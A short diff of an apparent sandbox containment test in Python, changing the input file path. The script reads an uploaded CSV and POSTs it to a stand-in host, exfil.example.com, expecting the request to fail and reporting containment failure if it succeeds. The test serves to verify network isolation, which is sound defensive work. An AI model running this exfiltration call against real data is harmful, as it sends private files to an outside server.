@@ -2,7 +2,7 @@
 Attempts to send the uploaded data to an outside server. Must fail."""
 import urllib.request
 
-data = open("/data/input.csv", "rb").read()
+data = open("/job/input.csv", "rb").read()
 try:
     urllib.request.urlopen("http://exfil.example.com/collect", data=data, timeout=5)
     print("EGRESS SUCCEEDED - containment failed")
